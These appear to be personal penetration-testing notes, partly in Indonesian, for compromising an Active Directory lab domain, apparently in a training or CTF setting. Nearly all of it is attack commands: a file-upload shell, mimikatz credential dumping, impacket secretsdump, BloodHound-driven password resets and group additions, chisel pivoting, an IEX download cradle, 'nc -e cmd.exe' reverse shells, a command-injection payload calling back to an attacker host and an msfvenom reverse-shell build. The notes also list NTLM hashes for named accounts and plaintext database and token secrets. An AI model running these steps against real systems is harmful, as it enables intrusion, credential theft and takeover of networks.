RETAC AD:

First Enumration
- file upload vuln
- got cve, upload, got shell
- upload reverse shell
- run printspoofer
- run powershell
- windows post exploitation
- net users /domain
PS C:\Temp> Get-ChildItem *.txt
20230610164245_loot.zip

#You have to got these!
Apa nama domain active directorynya? mdm.com
Apa nama hostname dari komputer yg ditakeover?
- MDM-WS01-NEW
Ada berapa jumlah user yang ada di domain dan siapa nama user yang sudah didapetin hashnya?
- Administrator : aad3b435b51404eeaad3b435b51404ee:1e91cb2d3e08002c2b4d0dae9be9ab46
- Guest
- Default Account
- WDAGUtilityAccount : 3b327e3da05ab910eaef0ea74a492a73
- kocho : 2799fae8a085db9f2f298d6378c5df32

Get-NetUser -Domain mdm.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname | Export-CSV -NoTypeInformation kerberoastable.csv

impacket, getnpusers.py 
impacket smbserver
secretdump.py
Shortest Paths from Owned Principals
add user to near domain local
net user ippsec Pleasesubs /add /domain 
net group "group name" /add username
IEX(New-Object Net.WebClient).downloadString(http://1.1.1.1/name.ps1')

crackmapexec.py smb ip -u adnub -H hash
kali: mkdir smb -> impacket-smbserver share 'pwd'
win: net use z: \\IP\share
win: copy file.zip z:

https://www.youtube.com/watch?v=ob9SgtFm6_g&t=2133s : 37

Set-DomainOjectOwner -Identity Herman -OwnerIdentity nico -verbose
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
Invoke-Bloodhound -CollectionMethod All
$pass = ConverTo-SecureString 'admin' -AsPlaintext -Force
Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
Get-DomainGroup -MemberIdentity Herman | select samaccountname
$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
Get-DomainGroup -MemberIdentiy Herman | select samaccountname

Back to admin directory -> type * | findstr password

proxychains smbclient -U mdm.com/kocho --pw-nt-hash //200.10.10.50/Developer
proxychains crackmapexec smb '200.10.10.50' -u 'kocho' -H '2799fae8a085db9f2f298d6378c5df32:2799fae8a085db9f2f298d6378c5df32' -d 'mdm.com' --share

Get-NetUser /domain -> doma -> IP
Pivoting with Chisel:
 create chisel server in kali
 creete chisel client in windows

Run Proxychains nmap/crackmapexec/smblient/rdp/win-evilrm
Enumeration -> get creds

Bloodhound Checks:
pwn user (kocho)
domain computer -> directcat 

git log
git diff

direct members
outbound object control -> punya privilege apa saja
inbound obect contol -> siapa yg bisa masuk kesana / gimana cara kita masuk

-NODE_ENV=production
-PG_DB=learning
-PG_USER=developer
-PG_PASS=@RumblingTheWorld
-PORT=4444
-TOKEN_SECRET=IamSuperSecret

Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
mimikatz:
privilege::debug
token::elevate
sekurlsa::logonpasswords

./chisel server -p 8001 --reverse
./chisel client 10.10.101.51:8001 R:1080:socks

xfreerdp
. .\powerup.ps

Pivoting:
kali : chisel server -p 8001 --reverse
win1 : chisel client 10.8.0.5:8001 R:1088:socks

win1 : chisel client 10.8.0.5:8001 0.0.0.0:1234:10.8.0.5:80 -> tunnel to port 80
kali : python3 -m http.server 80
win2 : curl -o file.exe http://ipwin1:1234/file.exe

win1 : chisel client 10.8.0.5:8001 0.0.0.0:9000:10.8.0.5:99 -> tunnel to port 99
kali : nc -nvlp 99
win2 : nc -nv ipwin1 9000 -e cmd.exe

autorecon ip
dirsearch 0u http
gobuster dir -w raft-medium txt,php/hsp,aspx -u http:ip -t 50 -b 404,403 -o root_8080.log
impacket

xmindmap

prives linux:
sudo -l
uname -a
linpeas

privesc wins:
whoami /priv (juicy potato/rogue potato)
winpeas
powerup

Reporting:
hostname && whoami && cat /root/proof.txt && ip a
hostname && whoami && type \users\Administrator\desktop\proof.txt && ipconfig

bug sql query: select user, authentication_string from user;
gtfobins -> for binary exploit
create malicious binary(calendar) (#!/bin/bash enter bash) then:
chmod +x binary
sudo /usr/local/bin/exiftool -filename=/usr/bin/calendar (binary path)
sudo /usr/bin/calendar

path traversal vuln

add dns -> /etc/hosts

command injection vuln:
powershell -c iwr http://ipkali/nc.exe -OutFile \windows\temp\nc.exe;windows\temp\nc.exe -nv ipkali 443 -e cmd

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.5 LPORT=66 -f exe -o sixreverse.exe
